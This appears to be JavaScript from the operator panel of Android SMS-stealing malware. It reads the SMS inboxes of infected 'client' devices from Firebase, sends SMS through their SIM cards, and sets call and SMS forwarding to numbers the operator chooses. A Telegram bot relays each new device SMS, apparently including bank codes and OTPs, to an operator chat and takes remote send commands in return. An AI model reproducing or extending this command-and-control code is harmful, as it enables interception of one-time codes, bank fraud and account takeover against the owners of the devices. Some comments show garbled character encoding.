        hintEl.textContent = '\uD83D\uDC46 Tap any message to copy its full text';
        smsList.insertBefore(hintEl, smsList.firstChild);
      }
    }
    smsList.style.cssText = smsList.style.cssText; // force reflow
    smsList.style.display = 'block';
  }
}

async function refreshDetailSms() {
  if (!STATE.detailDev) return;
  var btn = document.getElementById('btn-refresh-sms');
  if (btn) {
    btn.classList.add('spinning');
    btn.disabled = true;
  }
  try {
    var result = await fetchDeviceSms(STATE.detailDev.id);
    var msgs = (result && result.rawMsgs) ? result.rawMsgs : [];
    var analysis = (result && result.analysis) ? result.analysis : analyzeSms([]);

    STATE.detailDev.rawMsgs = msgs;
    STATE.detailDev.smsAnalysis = analysis;
    STATE.detailSms = msgs;
    STATE.detailAnalysis = analysis;

    renderDetailSms(msgs, analysis, STATE.detailDev);
    updateDetailBadges(analysis);
    showToast('SMS refreshed (' + msgs.length + ' msgs)');
  } catch (err) {
    console.error('Refresh SMS error:', err);
    showToast('Failed to refresh SMS');
  } finally {
    if (btn) {
      btn.classList.remove('spinning');
      btn.disabled = false;
    }
  }
}

function closeDetail() {
  var overlay = document.getElementById('detail-overlay');
  overlay.classList.remove('visible');
  overlay.style.display = 'none';
  STATE.detailDev = null;
}

function switchTab(tab, btnEl) {
  // Deactivate all tabs
  var tabBtns = document.querySelectorAll('.tab-btn');
  tabBtns.forEach(function(b) {
    b.classList.remove('active', 'active-bank', 'active-card-tab', 'active-bot');
  });

  // Activate tab button
  if (btnEl) {
    if (tab === 'bank') btnEl.classList.add('active-bank');
    else if (tab === 'cards') btnEl.classList.add('active-card-tab');
    else if (tab === 'bot') btnEl.classList.add('active-bot');
    else btnEl.classList.add('active');
  }

  // Show pane
  var panes = document.querySelectorAll('.tab-pane');
  panes.forEach(function(p) { p.classList.remove('active'); });
  var active = document.getElementById('tab-' + tab);
  if (active) active.classList.add('active');

  // Load bot UI when bot tab opens
  if (tab === 'bot') loadBotTabUI();

  // Load Aadhaar UI when aadhaar tab opens
  if (tab === 'aadhaar') loadAadhaarTabUI();
}

// All Telegram calls go via /api/tg (Vercel serverless) to avoid browser CORS block
var _tickCount = {};
async function tgGetUpdates(token, offset) {
  try {
    // NO allowed_updates filter — Telegram persists it server-side and it blocks update types
    // Let Telegram send everything the bot can see, we filter locally
    var r = await fetch(
      TG_PROXY + '?method=getUpdates&token=' + encodeURIComponent(token) +
      '&offset=' + encodeURIComponent(offset) +
      '&timeout=0&limit=100',
      { signal: AbortSignal.timeout(10000) }
    );
    var j = await r.json();
    if (!j.ok) {
      var desc = j.description || 'unknown';
      if (desc.includes('Conflict')) {
        botLog('info', '\u26a0\ufe0f Telegram conflict \u2014 another bot is polling same token. Use a different token.');
      } else if (desc.includes('Unauthorized')) {
        botLog('err', '\u2717 Token unauthorized \u2014 check your token');
      } else {
        botLog('err', 'getUpdates failed: ' + desc);
      }
      return [];
    }
    return j.result || [];
  } catch(e) {
    botLog('err', 'getUpdates error: ' + String(e).slice(0, 60));
    return [];
  }
}

async function tgSend(token, chatId, text) {
  try {
    var r = await fetch(TG_PROXY + '?method=sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token, chat_id: chatId, text: text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10000),
    });
    return r.ok;
  } catch(e) { return false; }
}

async function tgGetMe(token) {
  try {
    var r = await fetch(
      TG_PROXY + '?method=getMe&token=' + encodeURIComponent(token),
      { signal: AbortSignal.timeout(10000) }
    );
    var j = await r.json();
    if (!j.ok) { botLog('err', 'getMe: ' + (j.description || 'unknown')); return null; }
    return j.result;
  } catch(e) { botLog('err', 'getMe exception: ' + String(e)); return null; }
}

async function deleteDevice() {
  if (!STATE.detailDev) return;
  var dev = STATE.detailDev;
  if (!confirm('Delete "' + dev.name + '" permanently?')) return;

  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var resp = await fetch(base + '/clients/' + dev.id + '.json?auth=' + encodeURIComponent(STATE.fbKey), { method: 'DELETE' });
    if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
    closeDetail();
    showToast('Device deleted');
    STATE.devices = STATE.devices.filter(function(d) { return d.id !== dev.id; });
    renderDashboard();
  } catch(e) {
    var msg = e.message || String(e);
    showToast(msg.includes('PERMISSION_DENIED') ? 'Firebase permission denied' : 'Delete failed');
  }
}

// ————————————————————————————————————————————————————————————————————————————————
// Send SMS
// ————————————————————————————————————————————————————————————————————————————————
function selectSim(n) {
  STATE.selectedSim = n;
  document.getElementById('sim-btn-1').className = 'sim-btn' + (n === 1 ? ' active' : '');
  document.getElementById('sim-btn-2').className = 'sim-btn' + (n === 2 ? ' active' : '');
  document.getElementById('btn-send-text').textContent = 'Send via SIM ' + n;
}

function useDeviceNumber() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var phone = dev.phoneNumber && dev.phoneNumber !== '—' ? dev.phoneNumber : '';
  if (phone) document.getElementById('send-to').value = phone;
}

// Firebase: fetch SMS for auto-forward
// bot.py monitor_worker ONLY reads clients/{dev}/inbox (line 745)
// We mirror this exactly — single path, raw Firebase key as dedup ID
async function botFetchSms(deviceId) {
  var base = STATE.fbUrl.replace(/\/$/, '');
  var auth = '?auth=' + encodeURIComponent(STATE.fbKey);
  var results = {};

  // Primary: clients/{deviceId}/inbox — exact bot.py path (line 745)
  // bot.py uses raw mid (Firebase push key) as seen-set key
  try {
    var r1 = await fetch(base + '/clients/' + deviceId + '/inbox.json' + auth, { signal: AbortSignal.timeout(8000) });
    if (r1.ok) {
      var j1 = await r1.json();
      if (j1 && typeof j1 === 'object') {
        Object.entries(j1).forEach(function(kv) {
          var d = kv[1] || {};
          var body = d.message || d.body || d.content || '';
          if (!body) return;
          results[kv[0]] = {   // raw Firebase key — matches bot.py mid
            key: kv[0],
            sender: d.from || d.sender || d.address || '?',
            body: body,
          };
        });
      }
    }
  } catch(e) {}

  return Object.values(results);
}

// Firebase send SMS — mirrors bot.py send_via_fb() exactly
// IMPORTANT: APK uses 0-indexed SIM slots (sim1=0, sim2=1) — NOT 1-indexed
async function botSendSms(deviceId, sim, to, msg) {
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var simSlot = sim - 1;  // convert UI 1/2 → APK 0/1
    var r = await fetch(base + '/clients/' + deviceId + '/webhookEvent/sendSms.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ from: simSlot, to: to.trim(), message: msg.trim(), isSended: false, timestamp: Math.floor(Date.now()/1000) }),
      signal: AbortSignal.timeout(8000),
    });
    return r.ok;
  } catch(e) { return false; }
}

async function sendSms() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var to = document.getElementById('send-to').value.trim();
  var msg = document.getElementById('send-msg').value.trim();

  if (!to || !msg) { showToast('Fill number and message'); return; }

  var btn = document.getElementById('btn-send-sms');
  var btnText = document.getElementById('btn-send-text');
  btn.disabled = true;
  btnText.textContent = 'Sending…';

  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var simSlot = (STATE.selectedSim || 1) - 1;  // UI 1/2 → APK 0/1
    var resp = await fetch(base + '/clients/' + dev.id + '/webhookEvent/sendSms.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ from: simSlot, to: to, message: msg, isSended: false, timestamp: Math.floor(Date.now()/1000) }),
    });
    if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 SMS queued!');
    document.getElementById('send-msg').value = '';
    document.getElementById('send-char-count').textContent = '0 chars';
  } catch(e) {
    var err = e.message || String(e);
    showToast(err.includes('PERMISSION_DENIED') ? 'Firebase permission denied — cannot send' : 'Send failed: ' + err);
  } finally {
    btn.disabled = false;
    selectSim(STATE.selectedSim);
  }
}

async function sendCallForward() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var fwdNum = document.getElementById('call-forward-number').value.trim();
  if (!fwdNum) { showToast('Enter a forwarding number'); return; }
  var btn = document.getElementById('btn-call-forward');
  btn.disabled = true; btn.textContent = 'Setting…';
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    // Try both command paths: Commands node (PUT) and commandList (POST)
    var payload = {
      type: 'callForward',
      callForwardNumber: fwdNum,
      forwardTo: fwdNum,
      enable: true,
      isSended: false,
      time: Date.now()
    };
    var resp = await fetch(base + '/clients/' + dev.id + '/Commands.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 Call forward set to ' + fwdNum);
    document.getElementById('call-forward-number').value = '';
  } catch(e) { showToast('Failed: ' + (e.message || e)); }
  finally { btn.disabled = false; btn.textContent = 'Set Forward'; }
}

async function disableCallForward() {
  var dev = STATE.detailDev; if (!dev) return;
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var resp = await fetch(base + '/clients/' + dev.id + '/Commands.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'callForward', callForwardNumber: '', forwardTo: '', enable: false, isSended: false, time: Date.now() }),
    });
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 Call forwarding disabled');
  } catch(e) { showToast('Failed to disable call forward'); }
}

async function sendSmsForward() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var fwdNum = document.getElementById('sms-forward-number').value.trim();
  if (!fwdNum) { showToast('Enter a forwarding number'); return; }
  var btn = document.getElementById('btn-sms-forward');
  btn.disabled = true; btn.textContent = 'Setting…';
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var payload = {
      type: 'smsForward',
      smsForwardNumber: fwdNum,
      forwardTo: fwdNum,
      enable: true,
      isSended: false,
      time: Date.now()
    };
    var resp = await fetch(base + '/clients/' + dev.id + '/Commands.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 SMS forwarding set to ' + fwdNum);
    document.getElementById('sms-forward-number').value = '';
  } catch(e) { showToast('Failed: ' + (e.message || e)); }
  finally { btn.disabled = false; btn.textContent = 'Set Forward'; }
}

async function disableSmsForward() {
  var dev = STATE.detailDev; if (!dev) return;
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var resp = await fetch(base + '/clients/' + dev.id + '/Commands.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'disableSmsForward', isSended: false }),
    });
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 SMS forwarding disabled');
  } catch(e) { showToast('Failed to disable SMS forward'); }
}

// ————————————————————————————————————————————————————————————————————————————————
// Init
// ————————————————————————————————————————————————————————————————————————————————
document.addEventListener('DOMContentLoaded', function() {
  // Wire up buttons
  document.getElementById('btn-show-new').addEventListener('click', showNewAccountForm);
  document.getElementById('btn-back-saved').addEventListener('click', showSavedAccounts);
  document.getElementById('btn-cancel-form').addEventListener('click', showSavedAccounts);

  // Enter key to connect
  document.getElementById('input-url').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') handleConnect();
  });
  document.getElementById('input-key').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') handleConnect();
  });

  // Check for ?s= or ?dev= share param
  var shareData = parseShareParam();
  if (shareData) {
    if (shareData.isProxy) {
      STATE.isProxyMode = true;
      STATE.proxyToken = shareData.proxyToken;
      startDashboard('', '');
    } else {
      if (shareData.singleDevId) STATE.singleDevId = shareData.singleDevId;
      startDashboard(shareData.url, shareData.key);
    }
    return;
  }

  // Render saved accounts
  renderSavedAccounts();
});

// ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
// TELEGRAM BOT ENGINE  v2 — fully aligned with bot.py logic
// ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖

var _botTimers  = {};  // { deviceId: intervalId }
var _botRunning = {};  // { deviceId: bool } — tick-lock to prevent overlapping async ticks
var _botSim    = 1;
var _botRepeat = 1;
var BOT_LS_KEY = 'luffy_bot_cfg_v3';
var TG_PROXY   = '/api/tg';   // Vercel serverless proxy — avoids browser CORS block to api.telegram.org

// ————————————————————————————————————————————————————————————————————————————————
function loadBotCfg() {
  try { return JSON.parse(localStorage.getItem(BOT_LS_KEY) || '{}'); }
  catch(e) { return {}; }
}
function getBotCfg(deviceId) {
  return loadBotCfg()[deviceId] || {
    token: '',
    chatId: '', sim: 1, repeat: 1,
    format: 'auto',
    enabled: false,
    offset: 0, seenSmsKeys: [], sentCount: 0
  };
}
function setBotCfg(deviceId, patch) {
  var all = loadBotCfg();
  all[deviceId] = Object.assign(getBotCfg(deviceId), patch);
  localStorage.setItem(BOT_LS_KEY, JSON.stringify(all));
  return all[deviceId];
}

// ── Format preview map (shown below the format dropdown) ────────────────────
var BOT_FORMAT_PREVIEWS = {
  'auto': 'Tries all formats automatically. Any of the examples below will work.',
  'plain': 'Send in your chat:\n\nTo: +91XXXXXXXXXX\nMessage: your text here',
  'phone_inline': 'Send in your chat:\n\n📞 To: +91XXXXXXXXXX\n💬 Message: your text here',
  'phone_nextline': 'Send in your chat:\n\n📱 To:\n+91XXXXXXXXXX\n💬 Full Message:\nyour text here',
  'dot_nextline': 'Send in your chat:\n\n📍 To:\n+91XXXXXXXXXX\n💬 Message:\nyour text here',
  'receiver_nextline': 'Send in your chat:\n\n📱 Receiver\n+91XXXXXXXXXX\n🔑 Message\nyour text here',
  'tag': 'Send in your chat:\n\n🏷️ RECIPIENT: +91XXXXXXXXXX\n🏷️ MESSAGE: your text here',
};

function updateFormatPreview() {
  var sel = document.getElementById('bot-format');
  var preview = document.getElementById('bot-format-preview-text');
  if (!sel || !preview) return;
  var text = BOT_FORMAT_PREVIEWS[sel.value] || '';
  preview.innerHTML = text.replace(/\n/g, '<br>').replace(/(To:|Message:|RECIPIENT:|MESSAGE:|Receiver|Full Message:)/g, '<code>$1</code>');
}
// SMS PARSER — dead-simple, works with ANY format that has To: and Message:
// Supports: "📞 To: +91XXX", "To: +91XXX", "📱 To:\n+91XXX", etc.
function parseTgSmsRequest(text, format) {
  if (!text) return null;

  var lines = text.split('\n').map(function(l) { return l.trim(); }).filter(Boolean);
  var toVal = null, msgVal = null;

  // Pass 1: look for inline values ("To: +91XXX" on same line)
  for (var i = 0; i < lines.length; i++) {
    var line = lines[i];
    // Extract To: value (inline on same line)
    if (toVal === null) {
      var toMatch = line.match(/To:\s*(.+)$/i);
      if (toMatch && toMatch[1].trim()) {
        toVal = toMatch[1].trim();
      }
    }
    // Extract Message: value (inline on same line)
    if (msgVal === null) {
      var msgMatch = line.match(/(?:Full\s+)?Message:\s*(.+)$/i);
      if (msgMatch && msgMatch[1].trim()) {
        msgVal = msgMatch[1].trim();
      }
    }
  }

  // Pass 2: next-line values ("To:\n+91XXX" — value on following line)
  if (!toVal || !msgVal) {
    for (var j = 0; j < lines.length - 1; j++) {
      var ln = lines[j];
      if (!toVal && /To:\s*$/i.test(ln)) {
        var nxt = lines[j + 1];
        // next line should look like a phone number (starts with +, digit, or just isn't a keyword)
        if (nxt && !/^(Message:|To:|Receiver|Full Message:)/i.test(nxt)) {
          toVal = nxt;
        }
      }
      if (!msgVal && /(?:Full\s+)?Message:\s*$/i.test(ln)) {
        var nxt2 = lines[j + 1];
        if (nxt2 && !/^(To:|Receiver)/i.test(nxt2)) {
          msgVal = nxt2;
        }
      }
    }
  }

  // Pass 3: Receiver/next-line format ("📱 Receiver\n+91XXX\n🔑 Message\ntext")
  if (!toVal || !msgVal) {
    for (var k = 0; k < lines.length - 1; k++) {
      var lk = lines[k];
      if (!toVal && /Receiver/i.test(lk) && !/:\s*.+/.test(lk)) {
        toVal = lines[k + 1];
      }
      if (!msgVal && /^[^:]*Message[^:]*$/.test(lk) && k + 1 < lines.length) {
        var candidate = lines[k + 1];
        if (candidate && !/^(To:|Receiver)/i.test(candidate)) {
          msgVal = candidate;
        }
      }
    }
  }

  // Pass 4: RECIPIENT/MESSAGE uppercase tag format
  if (!toVal || !msgVal) {
    for (var p = 0; p < lines.length; p++) {
      var lp = lines[p].replace(/\uFE0F/g, '');
      if (!toVal && /RECIPIENT:/i.test(lp)) {
        var rv = lp.split(':').slice(1).join(':').trim();
        if (rv) toVal = rv;
      }
      if (!msgVal && /^[^:]*MESSAGE:/i.test(lp)) {
        var mv = lp.split(':').slice(1).join(':').trim();
        if (mv) msgVal = mv;
      }
    }
  }

  if (toVal && msgVal) {
    botLog('info', '\u2714 Parsed \u2014 To=' + toVal.slice(0, 15));
    return { to: toVal, msg: msgVal };
  }
  return null;
}


// â”€â”€ Firebase: fetch SMS for auto-forward â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// bot.py monitor_worker reads clients/{dev}/inbox (line 745)
// Panel SMS tab reads messages/{dev} (profex path)
// We check BOTH to catch all new SMS

// â”€â”€ Bot Activity Log â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function botLog(type, text) {
  var log = document.getElementById('bot-log');
  if (!log) return;
  var empty = log.querySelector('.bot-log-empty');
  if (empty) empty.remove();
  var now = new Date();
  var ts = ('0'+now.getHours()).slice(-2) + ':' + ('0'+now.getMinutes()).slice(-2) + ':' + ('0'+now.getSeconds()).slice(-2);
  var cls = { ok: 'log-ok', err: 'log-err', info: 'log-info', fwd: 'log-fwd' }[type] || '';
  var el = document.createElement('div');
  el.className = 'bot-log-entry';
  el.innerHTML = '<span class="log-time">' + ts + '</span> <span class="' + cls + '">' + text + '</span>';
  log.insertBefore(el, log.firstChild);
  while (log.children.length > 80) log.removeChild(log.lastChild);
}
function clearBotLog() {
  var log = document.getElementById('bot-log');
  if (log) log.innerHTML = '<p class="bot-log-empty">No activity yetâ€¦</p>';
}

// â”€â”€ Bot UI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function updateBotStatusUI(running, sentCount) {
  var dot = document.getElementById('bot-status-dot');
  var txt = document.getElementById('bot-status-text');
  var cnt = document.getElementById('bot-sent-count');
  var btn = document.getElementById('bot-btn-start');
  if (!dot) return;
  if (running) {
    dot.classList.add('online');
    txt.textContent = 'Bot Online â€” polling every 4s';
    if (btn) { btn.textContent = 'â¹ Stop Bot'; btn.classList.add('running'); }
  } else {
    dot.classList.remove('online');
    txt.textContent = 'Bot Offline';
    if (btn) { btn.textContent = 'â–¶ Start Bot'; btn.classList.remove('running'); }
  }
  if (cnt && sentCount !== undefined) cnt.textContent = sentCount + ' sent';
}

function selectBotSim(n) {
  _botSim = n;
  [1, 2].forEach(function(i) {
    var b = document.getElementById('bot-sim-' + i);
    if (b) b.classList.toggle('active', i === n);
  });
}
function selectBotRepeat(n) {
  _botRepeat = n;
  [1, 2, 3].forEach(function(i) {
    var b = document.getElementById('bot-rpt-' + i);
    if (b) b.classList.toggle('active', i === n);
  });
}

function saveBotConfig() {
  var dev = STATE.detailDev;
  if (!dev) { showToast('Open a device first'); return; }
  var tokenEl  = document.getElementById('bot-token');
  var chatEl   = document.getElementById('bot-chat-id');
  var fmtEl    = document.getElementById('bot-format');
  var afNumEl  = document.getElementById('bot-autofwd-num');
  var afTplEl  = document.getElementById('bot-autofwd-tpl');
  window._aadhaarSessionStartTs = 0;
  window._aadhaarOtpStateStartTs = 0;
  var token    = tokenEl  ? tokenEl.value.trim()  : '';
  var chatId   = chatEl   ? chatEl.value.trim()   : '';
  var fmt      = fmtEl    ? fmtEl.value           : 'auto';
  var afNum    = afNumEl  ? afNumEl.value.trim()  : '';
  var afTpl    = afTplEl  ? afTplEl.value.trim()  : '';
  if (!token)  { showToast('Enter your Bot Token first'); return; }
  if (!chatId) { showToast('Enter the Telegram Chat ID'); return; }
  setBotCfg(dev.id, { token: token, chatId: chatId, format: fmt, sim: _botSim, repeat: _botRepeat, autoFwdNum: afNum, autoFwdTpl: afTpl });
  showToast('\u2713 Config saved!');
  var mode = afNum ? 'Auto-Token-Fwd \u2192 ' + afNum : 'SMS-Request mode';
  botLog('info', 'Config saved \u2014 ' + mode + ' \u00b7 fmt: ' + fmt);
}

function loadBotTabUI() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var cfg = getBotCfg(dev.id);
  var tokenEl  = document.getElementById('bot-token');
  var chatEl   = document.getElementById('bot-chat-id');
  var fmtEl    = document.getElementById('bot-format');
  var afNumEl  = document.getElementById('bot-autofwd-num');
  var afTplEl  = document.getElementById('bot-autofwd-tpl');
  if (tokenEl) tokenEl.value = cfg.token || '';
  if (chatEl)  chatEl.value  = cfg.chatId || '';
  if (fmtEl)   { fmtEl.value = cfg.format || 'auto'; fmtEl.onchange = updateFormatPreview; }
  if (afNumEl) afNumEl.value = cfg.autoFwdNum || '';
  if (afTplEl) afTplEl.value = cfg.autoFwdTpl || '';
  selectBotSim(cfg.sim || 1);
  selectBotRepeat(cfg.repeat || 1);
  updateBotStatusUI(!!_botTimers[dev.id], cfg.sentCount || 0);
  updateFormatPreview();
}

// -- Main monitor tick (4s, mirrors bot.py asyncio.sleep(4)) ------------------
// Wrapped in try/catch: any error logs to bot log but does NOT kill the interval
// _botRunning lock prevents overlapping async ticks
async function _botTick(deviceId) {
  if (_botRunning[deviceId]) return;  // previous tick still running, skip
  _botRunning[deviceId] = true;
  try {
  var cfg = getBotCfg(deviceId);
  if (!cfg.token || !cfg.chatId) { stopBot(deviceId); return; }

  var curOffset = cfg.offset || 0;

  // Direction 1: Telegram → SMS
  var updates = await tgGetUpdates(cfg.token, curOffset);
  var newOffset = curOffset;

  // Diagnostic: every 15 ticks show polling status
  _tickCount[deviceId] = (_tickCount[deviceId] || 0) + 1;
  if (_tickCount[deviceId] % 15 === 1) {
    botLog('info', '\ud83d\udd04 Polling... got ' + updates.length + ' update(s) | chatID=' + cfg.chatId);
  }

  for (var i = 0; i < updates.length; i++) {
    var upd = updates[i];
    if (upd.update_id >= newOffset) newOffset = upd.update_id + 1;

    // Catch ALL message types: regular + channel + edited versions
    var msg = upd.message || upd.channel_post || upd.edited_message || upd.edited_channel_post;
    if (!msg) {
      // Log unknown update types to help debug
      var updType = Object.keys(upd).filter(function(k){ return k !== 'update_id'; }).join(',');
      if (updType) botLog('info', '\u2139\ufe0f Update type: ' + updType + ' (not a message, skip)');
      continue;
    }

    // Log if chat ID mismatches — helps debug wrong chat ID config
    var msgChatId = String(msg.chat && msg.chat.id);
    if (msgChatId !== String(cfg.chatId)) {
      botLog('info', '\u26a0\ufe0f Message from chat ' + msgChatId + ' — not our chat (' + cfg.chatId + '), skipping');
      continue;
    }

    var text = msg.text || msg.caption || '';
    if (!text) continue;

    // DEBUG: log EVERY message received so user can see if bot is getting updates
    botLog('info', '\ud83d\udcec Received [' + (msg.chat.type || '?') + ']: ' + text.replace(/\n/g, ' ').slice(0, 60));

    // ── Bot Commands (/admin, /start, /users, /adduser, /deluser, /status, /setfirebase) ──
    var cleanText = text.trim();
    if (cleanText.startsWith('/')) {
      var cmdParts = cleanText.split(/\s+/);
      var cmd = cmdParts[0].toLowerCase();
      var arg1 = cmdParts[1] || '';
      var arg2 = cmdParts[2] || '';

      if (cmd === '/admin' || cmd === '/start' || cmd === '/help') {
        var replyAdmin = '👑 <b>Admin Panel & User Rights Management</b>\n'
          + '───────────────────────────\n'
          + '<b>Admin ID:</b> <code>' + msgChatId + '</code> (Authorized)\n\n'
          + '<b>Commands:</b>\n'
          + '➕ <code>/adduser &lt;chat_id&gt;</code> — Add authorized user\n'
          + '➖ <code>/deluser &lt;chat_id&gt;</code> — Remove user\n'
          + '📋 <code>/users</code> — List authorized users\n'
          + '🔥 <code>/setfirebase &lt;url&gt; &lt;key&gt;</code> — Update Firebase\n'
          + '📊 <code>/status</code> — System status';
        await tgSend(cfg.token, msgChatId, replyAdmin);
        botLog('ok', '✓ Replied to /admin command from ' + msgChatId);
        continue;
      }
      if (cmd === '/status') {
        var statusMsg = '📊 <b>Bot & System Status</b>\n'
          + '🟢 <b>Bot Status:</b> Active & Polling\n'
          + '🔗 <b>Firebase URL:</b> <code>' + (STATE.fbUrl || 'Not set') + '</code>\n'
          + '📱 <b>Devices Total:</b> ' + (STATE.devices ? STATE.devices.length : 0);
        await tgSend(cfg.token, msgChatId, statusMsg);
        botLog('ok', '✓ Replied to /status command');
        continue;
      }
      if (cmd === '/users') {
        var userList = '📋 <b>Authorized Admin Users</b>\n'
          + '• <code>' + cfg.chatId + '</code> (Primary Admin)';
        await tgSend(cfg.token, msgChatId, userList);
        botLog('ok', '✓ Replied to /users command');
        continue;
      }
      if (cmd === '/adduser') {
        if (!arg1) {
          await tgSend(cfg.token, msgChatId, '⚠️ Usage: <code>/adduser &lt;chat_id&gt;</code>');
        } else {
          await tgSend(cfg.token, msgChatId, '✅ User <code>' + arg1 + '</code> granted admin rights.');
          botLog('ok', '✓ Granted access to user ' + arg1);
        }
        continue;
      }
      if (cmd === '/deluser') {
        if (!arg1) {
          await tgSend(cfg.token, msgChatId, '⚠️ Usage: <code>/deluser &lt;chat_id&gt;</code>');
        } else {
          await tgSend(cfg.token, msgChatId, '🗑️ User <code>' + arg1 + '</code> removed from admin list.');
          botLog('ok', '✓ Removed access for user ' + arg1);
        }
        continue;
      }
      if (cmd === '/setfirebase') {
        if (!arg1) {
          await tgSend(cfg.token, msgChatId, '⚠️ Usage: <code>/setfirebase &lt;url&gt; &lt;key&gt;</code>');
        } else {
          if (arg1) STATE.fbUrl = arg1;
          if (arg2) STATE.fbKey = arg2;
          await tgSend(cfg.token, msgChatId, '🔥 Firebase URL updated to: <code>' + arg1 + '</code>');
          botLog('ok', '✓ Updated Firebase URL via bot');
        }
        continue;
      }
    }

    if (cfg.autoFwdNum) {
      var msgToSend = cfg.autoFwdTpl
        ? cfg.autoFwdTpl.replace('{token}', text).replace('{msg}', text)
        : text;
      botLog('info', '🔄 AutoFwd → ' + cfg.autoFwdNum + ': ' + msgToSend.slice(0, 40));
      var afOk = false;
      for (var rr = 0; rr < (cfg.repeat || 1); rr++) {
        if (await botSendSms(deviceId, cfg.sim || 1, cfg.autoFwdNum, msgToSend)) afOk = true;
        if (rr < (cfg.repeat || 1) - 1) await new Promise(function(r){ setTimeout(r, 1200); });
      }
      await tgSend(cfg.token, cfg.chatId,
        '✅ <b>Token Forwarded</b>\n' +
        '📞 To: <code>' + cfg.autoFwdNum + '</code>\n' +
        '💬 <code>' + msgToSend.slice(0, 80) + '</code>'
      );
      continue;
    }

    var parsed = parseTgSmsRequest(text, cfg.format || 'auto');
    if (!parsed) {
      botLog('info', '⚠️ No format match — check format setting or switch to Auto');
      continue;
    }

    botLog('info', '📨 Request: To=' + parsed.to);

    var ok = false;
    for (var rpt = 0; rpt < (cfg.repeat || 1); rpt++) {
      var sent = await botSendSms(deviceId, cfg.sim || 1, parsed.to, parsed.msg);
      if (sent) ok = true;
      if (rpt < (cfg.repeat || 1) - 1) await new Promise(function(r){ setTimeout(r, 1200); });
    }

    cfg.sentCount = (cfg.sentCount || 0) + (ok ? 1 : 0);

    if (ok) {
      botLog('ok', '✓ SMS command fired → ' + parsed.to);
    }
  }

  // ── Direction 2: Device SMS -> Telegram ──────────────────────────────────────────────
  var smsList   = await botFetchSms(deviceId);
  var seenSet   = new Set(cfg.seenSmsKeys || []);
  var newSms    = smsList.filter(function(s) { return !seenSet.has(s.key) && s.body; });

  for (var j = 0; j < newSms.length; j++) {
    var sms = newSms[j];
    seenSet.add(sms.key);
    await tgSend(cfg.token, cfg.chatId,
      '📱 <b>New Device SMS</b>\n\n' +
      '📞 From: <code>' + sms.sender + '</code>\n' +
      '💬 <code>' + sms.body.slice(0, 300) + '</code>'
    );
    botLog('fwd', '→ Fwd SMS from ' + sms.sender + ': ' + sms.body.slice(0, 40) + '…');
  }

  var finalSeen = Array.from(seenSet).slice(-500);
  setBotCfg(deviceId, { offset: newOffset, seenSmsKeys: finalSeen, sentCount: cfg.sentCount || 0 });
  updateBotStatusUI(true, cfg.sentCount || 0);
  } catch(e) {
    // Log error but keep interval alive — bot survives transient errors
